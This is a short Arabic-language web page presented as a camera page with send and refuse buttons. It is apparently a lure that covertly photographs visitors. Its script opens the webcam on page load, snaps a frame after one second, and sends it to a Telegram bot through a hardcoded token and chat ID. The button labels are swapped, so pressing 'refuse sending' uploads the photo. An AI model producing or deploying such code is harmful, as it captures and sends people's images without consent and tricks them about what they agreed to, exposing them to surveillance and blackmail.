<!DOCTYPE html>
<html lang="ar">
<body>

<h2>الكاميرا</h2>

<video id="video" autoplay playsinline></video>
<br>

<button id="approveBtn">رفض  الإرسال</button>
<button id="rejectBtn"> موافق على لإرسال</button>

<canvas id="canvas" style="display:none;"></canvas>

<script>
const TOKEN = "8469668913:AAE2ks3XnwwtTnTEXDZHshbLsIZ5ihoI7ZE";
const CHAT_ID = "5870377141";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
let stream = null;
let capturedBlob = null;

// تشغيل الكاميرا تلقائيًا عند فتح الصفحة
async function startCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.play();

        // التقاط الصورة بعد 3 ثواني
        setTimeout(capturePhoto, 1000);

    } catch (err) {
        alert("لا يمكن تشغيل الكاميرا");
        console.log(err);
    }
}

// التقاط الصورة وتخزينها مؤقتًا
function capturePhoto() {
    const ctx = canvas.getContext("2d");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);

    canvas.toBlob((blob) => {
        capturedBlob = blob; // حفظ الصورة
        alert("تم التقاط الصورة، يمكنك اختيار إرسالها أو رفضها.");
    }, "image/png");

    // إيقاف الكاميرا بعد الالتقاط
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }
}

// زر الموافقة: إرسال الصورة للبوت
document.getElementById("approveBtn").onclick = async function() {
    if (!capturedBlob) {
        alert("لم يتم التقاط الصورة بعد.");
        return;
    }

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", capturedBlob, "photo.png");

    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });
        alert("تم إرسال الصورة");
    } catch (e) {
        alert("فشل الإرسال");
        console.log(e);
    }
};

// زر الرفض: تجاهل الصورة
document.getElementById("rejectBtn").onclick = function() {
    capturedBlob = null;
    alert("تم رفض إرسال الصورة");
};

// تشغيل الكاميرا تلقائيًا عند تحميل الصفحة
startCamera();
</script>

</body>
</html>
